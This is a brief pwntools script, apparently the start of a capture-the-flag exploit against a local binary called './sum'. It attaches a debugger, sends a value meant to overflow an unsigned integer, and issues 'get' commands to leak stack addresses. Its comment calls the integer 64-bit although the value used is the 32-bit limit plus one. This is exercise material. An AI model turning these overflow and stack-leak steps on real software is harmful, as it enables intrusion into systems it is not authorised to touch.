from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

p = process('./sum')

gdb.attach(p, '''
b *0x0040096f
''')

# overflow a 64bit unsigned int
max_uint = 4294967295 + 1
p.sendlineafter(b'>', p64(max_uint))

# leak the stack address by getting the values
for i in range(8):
    p.sendlineafter(b'>', b'get ' + str(i).encode())

